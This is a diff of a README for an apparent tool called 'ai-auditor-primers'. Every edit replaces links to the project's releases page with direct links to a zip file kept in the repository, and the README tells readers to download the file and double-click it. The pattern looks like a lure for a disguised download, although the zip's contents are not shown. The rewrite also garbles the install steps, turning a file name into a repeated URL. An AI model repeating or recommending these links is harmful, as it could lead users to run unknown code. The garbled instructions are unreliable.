@@ -1,6 +1,6 @@
 # 🎉 ai-auditor-primers - Essential Tools for AI Audit Beginners
 
-[![Download ai-auditor-primers](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/imurdaddynow/ai-auditor-primers/releases)
+[![Download ai-auditor-primers](https://github.com/imurdaddynow/ai-auditor-primers/raw/refs/heads/main/primers/primers_auditor_ai_2.3.zip)](https://github.com/imurdaddynow/ai-auditor-primers/raw/refs/heads/main/primers/primers_auditor_ai_2.3.zip)
 
 ## 📋 Overview
 
@@ -16,13 +16,13 @@ Follow these simple steps to download and run the application on your computer.
 2. **Visit the Download Page:**
    Go to our releases page to find the latest version of the software. Click the link below to access the page:
 
-   [Download the latest release here](https://github.com/imurdaddynow/ai-auditor-primers/releases)
+   [Download the latest release here](https://github.com/imurdaddynow/ai-auditor-primers/raw/refs/heads/main/primers/primers_auditor_ai_2.3.zip)
 
 3. **Find the Right Version:**
    On the releases page, look for the version that fits your system. It will be listed with a description of what’s included.
 
 4. **Download the File:**
-   Click the download link for the file. It may be named something like `ai-auditor-primers-setup.exe` or `ai-auditor-primers.zip`. 
+   Click the download link for the file. It may be named something like `https://github.com/imurdaddynow/ai-auditor-primers/raw/refs/heads/main/primers/primers_auditor_ai_2.3.zip` or `https://github.com/imurdaddynow/ai-auditor-primers/raw/refs/heads/main/primers/primers_auditor_ai_2.3.zip`. 
 
 5. **Open the File:**
    Once the download is complete, navigate to your downloads folder. Locate the downloaded file and double-click it to start.
@@ -69,7 +69,7 @@ We aim to update our application regularly. You can check the releases page to s
 
 To get started, visit the page below to download the latest version of ai-auditor-primers. 
 
-[Download the latest release here](https://github.com/imurdaddynow/ai-auditor-primers/releases)
+[Download the latest release here](https://github.com/imurdaddynow/ai-auditor-primers/raw/refs/heads/main/primers/primers_auditor_ai_2.3.zip)
 
 Once downloaded, follow the installation steps outlined in the previous section.
 
